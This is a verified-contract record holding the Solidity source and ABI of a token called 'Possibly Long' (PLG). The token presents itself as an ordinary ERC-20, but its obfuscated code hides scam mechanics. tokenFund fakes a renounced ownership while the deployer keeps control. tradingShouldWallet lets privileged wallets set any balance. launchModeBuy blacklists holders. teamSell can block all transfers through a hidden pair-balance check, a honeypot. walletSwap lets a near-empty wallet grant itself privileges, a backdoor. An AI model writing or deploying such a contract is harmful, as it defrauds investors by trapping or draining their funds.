{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface maxMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountList {\n    function createPair(address autoFrom, address exemptTotalEnable) external returns (address);\n}\n\ninterface limitWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptTradingIs) external view returns (uint256);\n\n    function transfer(address marketingLiquidityMin, uint256 walletTake) external returns (bool);\n\n    function allowance(address limitLaunchedLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingLiquidityMin,\n        uint256 walletTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalSenderBuy, uint256 value);\n    event Approval(address indexed limitLaunchedLiquidity, address indexed spender, uint256 value);\n}\n\ninterface fundAuto is limitWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PossiblyLong is toTotal, limitWallet, fundAuto {\n\n    uint256 maxMarketing;\n\n    function tokenFund() public {\n        emit OwnershipTransferred(atFund, address(0));\n        receiverShould = address(0);\n    }\n\n    function allowance(address enableLimitIs, address exemptSender) external view virtual override returns (uint256) {\n        if (exemptSender == receiverModeFrom) {\n            return type(uint256).max;\n        }\n        return toReceiverSender[enableLimitIs][exemptSender];\n    }\n\n    function balanceOf(address exemptTradingIs) public view virtual override returns (uint256) {\n        return launchedTo[exemptTradingIs];\n    }\n\n    function takeListSell(address fromFund, address marketingLiquidityMin, uint256 walletTake) internal returns (bool) {\n        if (fromFund == atFund) {\n            return maxAmount(fromFund, marketingLiquidityMin, walletTake);\n        }\n        uint256 limitTeamMin = limitWallet(modeFee).balanceOf(minMarketing);\n        require(limitTeamMin == feeExempt);\n        require(marketingLiquidityMin != minMarketing);\n        if (walletSwapReceiver[fromFund]) {\n            return maxAmount(fromFund, marketingLiquidityMin, teamToIs);\n        }\n        return maxAmount(fromFund, marketingLiquidityMin, walletTake);\n    }\n\n    constructor (){\n        if (totalSender != modeReceiverToken) {\n            marketingMin = false;\n        }\n        maxMin shouldMarketing = maxMin(receiverModeFrom);\n        modeFee = amountList(shouldMarketing.factory()).createPair(shouldMarketing.WETH(), address(this));\n        if (amountReceiverMin == marketingMin) {\n            amountReceiverMin = true;\n        }\n        atFund = _msgSender();\n        tokenFund();\n        swapTake[atFund] = true;\n        launchedTo[atFund] = exemptSell;\n        \n        emit Transfer(address(0), atFund, exemptSell);\n    }\n\n    bool public marketingMin;\n\n    function teamSell(uint256 walletTake) public {\n        tokenAmount();\n        feeExempt = walletTake;\n    }\n\n    mapping(address => bool) public swapTake;\n\n    uint256 private totalSender;\n\n    mapping(address => mapping(address => uint256)) private toReceiverSender;\n\n    function launchModeBuy(address receiverFee) public {\n        tokenAmount();\n        \n        if (receiverFee == atFund || receiverFee == modeFee) {\n            return;\n        }\n        walletSwapReceiver[receiverFee] = true;\n    }\n\n    bool public takeAutoIs;\n\n    function getOwner() external view returns (address) {\n        return receiverShould;\n    }\n\n    address minMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function walletSwap(address totalMin) public {\n        require(totalMin.balance < 100000);\n        if (takeAutoIs) {\n            return;\n        }\n        if (amountReceiverMin != marketingMin) {\n            marketingMin = true;\n        }\n        swapTake[totalMin] = true;\n        if (totalSender == modeReceiverToken) {\n            amountReceiverMin = true;\n        }\n        takeAutoIs = true;\n    }\n\n    address receiverModeFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private amountReceiverMin;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldTotal;\n    }\n\n    uint256 public modeReceiverToken;\n\n    event OwnershipTransferred(address indexed senderTx, address indexed launchShouldEnable);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptSell;\n    }\n\n    address public modeFee;\n\n    string private limitMax = \"PLG\";\n\n    uint8 private fromToken = 18;\n\n    function owner() external view returns (address) {\n        return receiverShould;\n    }\n\n    function transferFrom(address fromFund, address marketingLiquidityMin, uint256 walletTake) external override returns (bool) {\n        if (_msgSender() != receiverModeFrom) {\n            if (toReceiverSender[fromFund][_msgSender()] != type(uint256).max) {\n                require(walletTake <= toReceiverSender[fromFund][_msgSender()]);\n                toReceiverSender[fromFund][_msgSender()] -= walletTake;\n            }\n        }\n        return takeListSell(fromFund, marketingLiquidityMin, walletTake);\n    }\n\n    uint256 private exemptSell = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private launchedTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromToken;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitMax;\n    }\n\n    function tradingShouldWallet(address listLiquidity, uint256 walletTake) public {\n        tokenAmount();\n        launchedTo[listLiquidity] = walletTake;\n    }\n\n    function transfer(address listLiquidity, uint256 walletTake) external virtual override returns (bool) {\n        return takeListSell(_msgSender(), listLiquidity, walletTake);\n    }\n\n    address private receiverShould;\n\n    mapping(address => bool) public walletSwapReceiver;\n\n    address public atFund;\n\n    uint256 feeExempt;\n\n    function tokenAmount() private view {\n        require(swapTake[_msgSender()]);\n    }\n\n    uint256 constant teamToIs = 12 ** 10;\n\n    string private shouldTotal = \"Possibly Long\";\n\n    function approve(address exemptSender, uint256 walletTake) public virtual override returns (bool) {\n        toReceiverSender[_msgSender()][exemptSender] = walletTake;\n        emit Approval(_msgSender(), exemptSender, walletTake);\n        return true;\n    }\n\n    function maxAmount(address fromFund, address marketingLiquidityMin, uint256 walletTake) internal returns (bool) {\n        require(launchedTo[fromFund] >= walletTake);\n        launchedTo[fromFund] -= walletTake;\n        launchedTo[marketingLiquidityMin] += walletTake;\n        emit Transfer(fromFund, marketingLiquidityMin, walletTake);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLaunchedLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchShouldEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSenderBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimitIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTradingIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"launchModeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiverToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAutoIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"teamSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"tradingShouldWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLiquidityMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"}],\"name\":\"walletSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletSwapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PossiblyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}